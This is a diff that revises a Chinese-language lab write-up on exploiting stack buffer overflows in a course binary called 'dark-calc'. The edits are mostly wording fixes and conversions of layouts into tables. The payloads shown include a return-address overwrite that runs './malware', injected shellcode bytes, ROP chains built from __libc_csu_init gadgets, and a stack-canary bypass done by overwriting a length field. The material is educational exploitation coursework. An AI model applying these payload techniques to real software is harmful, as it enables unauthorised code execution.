@@ -15,7 +15,7 @@
 
 #### 2. 看看 code:x86:64 部分，程序停下来的位置...似乎不是 input 函数的第一条指令。 停下来位置之前的三条指令是在做什么？ $rbp 此刻指向的内存地址当中的值来自哪里？
 
-停下来之前执行了
+函数开头的三条指令如下；箭头所在的 `sub rsp, 0x10` 此时尚未执行：
 
 ```
      0x401977 <input+0000>     push   rbp
@@ -59,7 +59,7 @@ gef➤  x/gx $rsp
 
 我们可以发现这条call input指令把`0x0000000000401ad1`压入栈顶
 
-接下来，我们`si si si`跳到与`b input`等价的位置，查看栈上元素
+接下来，我们执行两次 `si`，到达与 `b input` 等价的位置（`sub rsp, 0x10` 之前），查看栈上元素
 
 ```
 gef➤  x/2gx $rbp
@@ -116,7 +116,7 @@ rip            0x401ad1            0x401ad1 <main+14>
 
 可以看出栈顶元素被取出并放入了rip
 
-总结上面的发现可知，call input会将下一条指令的地址压栈，然后跳转到input中，input开头会`push  rbp ; mov  rbp,rsp`先保存main的栈基，然后重新建立栈帧。input结束时leave相当于`mov rsp,rbp ； pop rbp`先清空input的栈，然后去出栈顶元素（此时是main的栈基）放到rbp中；ret相当于`pop rip`将下一条指令地址放入rip中。
+总结上面的发现可知，call input会将下一条指令的地址压栈，然后跳转到input中，input开头会`push  rbp ; mov  rbp,rsp`先保存main的栈基，然后重新建立栈帧。input结束时leave相当于`mov rsp,rbp ； pop rbp`先清空input的栈，然后取出栈顶元素（此时是main的栈基）放到rbp中；ret 的效果可理解为弹出栈顶返回地址并写入 rip（`pop rip` 仅表示语义，并非合法的 x86 指令）。
 
 ## 用不同长度的字符串输入测试 `dark-calc`
 
@@ -134,7 +134,7 @@ gef➤  x/4gx $rsp
 0x721000800fe0: 0x0000720041414141      0x0000000000401ad1
 ```
 
-输入A的ASCII是0x41，我们可以发现多出的4Bytes被写到了比rbp更高的地址中，破坏了rbp～rbp+8的原有内容（main的栈基），但main后续没有使用rbp，所以并不会报错。同理可知，如果输入了32个A，那么会破坏input下一条指令地址（rbp+8~rbp+16），没有ret一个合法的指令地址，因此报错。
+输入A的ASCII是0x41，我们可以发现多出的 4 Bytes 以及 gets 追加的一个 NUL 字节被写到了 rbp 开始的地址中，破坏了rbp～rbp+8的原有内容（main的栈基），但main后续没有使用rbp，所以并不会报错。同理可知，如果输入了32个A，那么会破坏input下一条指令地址（rbp+8~rbp+16），没有ret一个合法的指令地址，因此报错。
 
 ## 利用缓冲区漏洞执行 `./malware`
 
@@ -160,9 +160,11 @@ gef➤  x/4gx $rsp
 
 因此，我们的payload应当是：
 
-```
-[./malware](16bytes) + (8bytes) + (0x401a6b)(8bytes)
-```
+| 长度 | 内容 | 作用 |
+| --- | --- | --- |
+| 16 Bytes | `./malware #` + 5 个 `A` | 命令与缓冲区填充 |
+| 8 Bytes | 8 个 `A` | 覆盖保存的 rbp |
+| 8 Bytes | `0x401a6b`（小端序） | 覆盖返回地址 |
 
 最终构造为
 
@@ -176,7 +178,7 @@ payload = b"./malware #AAAAAAAAAAAAA\x6b\x1a\x40\x00\x00\x00\x00\x00"
 
 ## 用 GDB 检查 main 函数的机器码 
 
-我们按照要求使用进行操作，查看main从第一条指令地址向高地址的内容
+我们按照要求使用 GDB 进行操作，查看main从第一条指令地址向高地址的内容
 
 ```
 gef➤  disas main
@@ -197,11 +199,11 @@ gef➤  x/24bx 0x0000000000401ac3
 
 从上面的内容，结合[在线汇编器](https://defuse.ca/online-x86-assembler.htm)验证，我们可以看出前三条汇编对应的机器码是：
 
-```
-0x55 ->   0x0000000000401ac3 <+0>:     push   rbp
-0x48    0x89    0xe5 ->    0x0000000000401ac4 <+1>:     mov    rbp,rsp
-0xb8    0x00    0x00    0x00     0x00 ->   0x0000000000401ac7 <+4>:     mov    eax,0x0
-```
+| 指令地址 | 机器码 | 汇编指令 |
+| --- | --- | --- |
+| `0x401ac3` | `55` | `push rbp` |
+| `0x401ac4` | `48 89 e5` | `mov rbp, rsp` |
+| `0x401ac7` | `b8 00 00 00 00` | `mov eax, 0x0` |
 
 因此，不难发现这些机器码按执行顺序逐字节连续排在代码段里，指令之间没有任何分隔符或填充。
 
@@ -229,15 +231,15 @@ gef➤  si
 
 可以看出函数起始指令地址是0x401a87，grade在rdi中，我们需要将grade设置为4
 
-根据上面的分析，我们又知道在input中`rsp=0x721000800fd0` `rbp=0x721000800fe0`，因此我们的思路是在rsp～rbp这16Bytes中写出跳转并运行grade_eval()的指令，并在rbp+8-rbp+16的位置跳转到rsp执行这16Bytes的指令。构造如下：
+根据上面的分析，我们又知道在input中`rsp=0x721000800fd0` `rbp=0x721000800fe0`，因此我们的思路是在rsp～rbp这16Bytes中写出跳转并运行grade_eval()的指令，并在 rbp+8 至 rbp+16 的位置写入缓冲区起始地址，返回后执行其中 12 Bytes 的指令。构造如下：
 
-```
-bf 04 00 00 00	-> mov edi, 4
-b8 87 1a 40 00	-> mov eax, 0x401a87
-ff d0	          -> call rax
-AAAAAAAAAAAAA   -> 填充12个字节
-d0 0f 80 00 10 72 00 00	-> 返回地址 = rsp =0x721000800fd0
-```
+| 长度 | 字节内容 | 指令或作用 |
+| --- | --- | --- |
+| 5 Bytes | `bf 04 00 00 00` | `mov edi, 4` |
+| 5 Bytes | `b8 87 1a 40 00` | `mov eax, 0x401a87` |
+| 2 Bytes | `ff d0` | `call rax` |
+| 12 Bytes | `AAAAAAAAAAAA` | 填充至返回地址 |
+| 8 Bytes | `d0 0f 80 00 10 72 00 00` | 返回地址：`0x721000800fd0`，即缓冲区起始地址 |
 
 执行结果
 
@@ -319,32 +321,27 @@ d0 0f 80 00 10 72 00 00	-> 返回地址 = rsp =0x721000800fd0
   4019b3:	c3                   	ret
 ```
 
-发现执行printf时，rsi=0x41 rdi=0x401ac0，我们可以直接在攻击过程中设置好rdi，然后call -> 602038
+发现执行 printf 时，rsi=0x41、rdi=0x401ac0。我们可以在攻击过程中设置好这两个参数，然后通过地址 `0x602038` 处的 printf GOT 表项进行间接调用。
 
 因此我们的输入设计如下
 
-```
-16Btyes       填充
-8Bytes        填充
-8Bytes        0x401a34      ret
-8Bytes        0x401a2a      跳转到  pop  %rbx %rbp %r12 %r13 %r14 %r15; ret
-8Bytes        0             rbx
-8Bytes        1             rbp（这里注意到call后面有add;cmp;jne，所以我们设置rbx=0；rbp=1只循环一次）
-8Bytes        0x602038      r12（call的内容是r12 + 8*rbx）
-8Bytes        0x401ac0      r13（后面有mov r13 -> rdi）
-8Bytes        0x41          r14（后面有mov r14 -> rsi）
-8Bytes        0             r15没有被使用
-8Bytes        0x401a10      下一个指令位置
-8Bytes        填充           401a26处的rsp+=8会跳过这个位置
-8Bytes        填充           加入6个填充，因为还会重复执行一遍pop
-8Bytes        填充
-8Bytes        填充
-8Bytes        填充
-8Bytes        填充
-8Bytes        填充
-8Bytes        0x40134       ret
-8Bytes        0x4019b4      跳到main循环之后，程序正常退出
-```
+| 长度 | 内容 | 作用 |
+| --- | --- | --- |
+| 16 Bytes | 填充 | 填满 expression |
+| 8 Bytes | 填充 | 覆盖保存的 rbp |
+| 8 Bytes | `0x401a34` | `ret`，调整栈对齐 |
+| 8 Bytes | `0x401a2a` | 依次 pop rbx、rbp、r12、r13、r14、r15，然后 ret |
+| 8 Bytes | `0` | rbx |
+| 8 Bytes | `1` | rbp；配合 call 后的 add、cmp、jne，使循环只执行一次 |
+| 8 Bytes | `0x602038` | r12；间接调用读取 `[r12 + 8*rbx]` 中的函数地址 |
+| 8 Bytes | `0x401ac0` | r13；随后 `mov r13d, edi` |
+| 8 Bytes | `0x41` | r14；随后 `mov r14, rsi` |
+| 8 Bytes | `0` | r15；随后写入 rdx，printf 的此处格式不使用它 |
+| 8 Bytes | `0x401a10` | 下一个指令地址，进入调用片段 |
+| 8 Bytes | 填充 | `0x401a26` 处的 `rsp += 8` 跳过此项 |
+| 6 × 8 Bytes | 填充 | 对应之后的 6 次 pop |
+| 8 Bytes | `0x401a34` | `ret`，调整栈对齐 |
+| 8 Bytes | `0x4019b4` | 重新进入 main；随后 input 读到 EOF，经 exit(0) 正常退出 |
 
 验证：
 
@@ -356,13 +353,13 @@ d0 0f 80 00 10 72 00 00	-> 返回地址 = rsp =0x721000800fd0
 
 观察到`  401a32:	41 5f  pop  %r15`  `401a34:	c3    	ret`这里`5f c3`正好对应`pop rdi; ret`，所以我们直接构造下面的输入即可
 
-```
-24Bytes     填充
-8Bytes      0x401a34    ret
-8Bytes      0x401a33    pop rdi; ret
-8Bytes      0x4         rdi
-8Bytes      0x401978    grade_eval
-```
+| 长度 | 内容 | 作用 |
+| --- | --- | --- |
+| 24 Bytes | 填充 | 填满缓冲区并覆盖保存的 rbp |
+| 8 Bytes | `0x401a34` | `ret`，调整栈对齐 |
+| 8 Bytes | `0x401a33` | `pop rdi; ret` |
+| 8 Bytes | `0x4` | rdi 的值 |
+| 8 Bytes | `0x401978` | grade_eval 的入口地址 |
 
 也成功输出了Hope A will be your grade! 
 
@@ -408,29 +405,29 @@ d0 0f 80 00 10 72 00 00	-> 返回地址 = rsp =0x721000800fd0
   4017f4:	c3                   	ret
 ```
 
-可以看出我们在拷贝&f.logMsg + f.len <- f.expression之后才会进行canary检查，因此我们可以通过直接修改len把f.expression拷贝到rbp的更高地址上面。通过阅读反汇编，先确定栈上数据的分布
+可以看出我们在拷贝f.logMsg + f.len <- f.expression之后才会进行canary检查，因此我们可以通过直接修改len把f.expression拷贝到rbp的更高地址上面。通过阅读反汇编，先确定栈上数据的分布
 
-```
--0x120(rbp)     128Bytes          expression
--0xa0(rbp)      128Bytes          logMsg
--0x20(rbp)      4Bytes            int len
--0x1c(rbp)      20Bytes           pad[8] + 12Bytes空余
--0x8(rbp)       8Bytes            Canary
-```
+| 起始地址 | 长度 | 内容 |
+| --- | --- | --- |
+| `rbp - 0x120` | 128 Bytes | expression |
+| `rbp - 0xa0` | 128 Bytes | logMsg |
+| `rbp - 0x20` | 4 Bytes | int len |
+| `rbp - 0x1c` | 20 Bytes | pad[8] + 12 Bytes 空余 |
+| `rbp - 0x8` | 8 Bytes | Canary |
 
-就此我们确定我们的输入：在expresssion处输入128Bytes ROP，将len设置为0xa0，这样128Bytes的expression就被拷贝到了rbp的高地址处，且没有改变canary
+就此我们确定我们的输入：在 expression 开头布置 ROP 链，并填充其余字节，将len设置为0xa0，这样 128 Bytes 的 expression 就被拷贝到了从 rbp 开始的地址处，且没有改变canary
 
-另外我们在__libc_csu_init中发现一个细节`  4018a2:	41 5f  pop  %r15`  `4018a4:	c3    	ret`这里`5f c3`正好对应`pop rdi; ret`，这个地址是`0x418a3`因此我们可以根据这一点设置rdi=4，然后跳转到grade_eval函数中。最终payload设计如下
+另外我们在__libc_csu_init中发现一个细节`  4018a2:	41 5f  pop  %r15`  `4018a4:	c3    	ret`这里`5f c3`正好对应`pop rdi; ret`，这个地址是`0x4018a3`因此我们可以根据这一点设置rdi=4，然后跳转到grade_eval函数中。最终payload设计如下
 
-```
-8Btyes        填充
-8Btyes        0x418a3 
-8Btyes        rdi = 4
-8Btyes        0x401677 (grade_eval地址)
-8Btyes        填充
-216Bytes      填充
-4Bytes        0xa0 (len)
-```
+| 长度 | 内容 | 作用 |
+| --- | --- | --- |
+| 8 Bytes | 填充 | 拷贝后覆盖保存的 rbp |
+| 8 Bytes | `0x4018a3` | `pop rdi; ret` |
+| 8 Bytes | `4` | rdi 的值 |
+| 8 Bytes | `0x401677` | grade_eval 的入口地址 |
+| 8 Bytes | 填充 | ROP 链之后的填充 |
+| 216 Bytes | 填充 | 填充到 len 字段之前 |
+| 4 Bytes | `0xa0`（小端序） | 覆盖 len |
 
 验证：
 
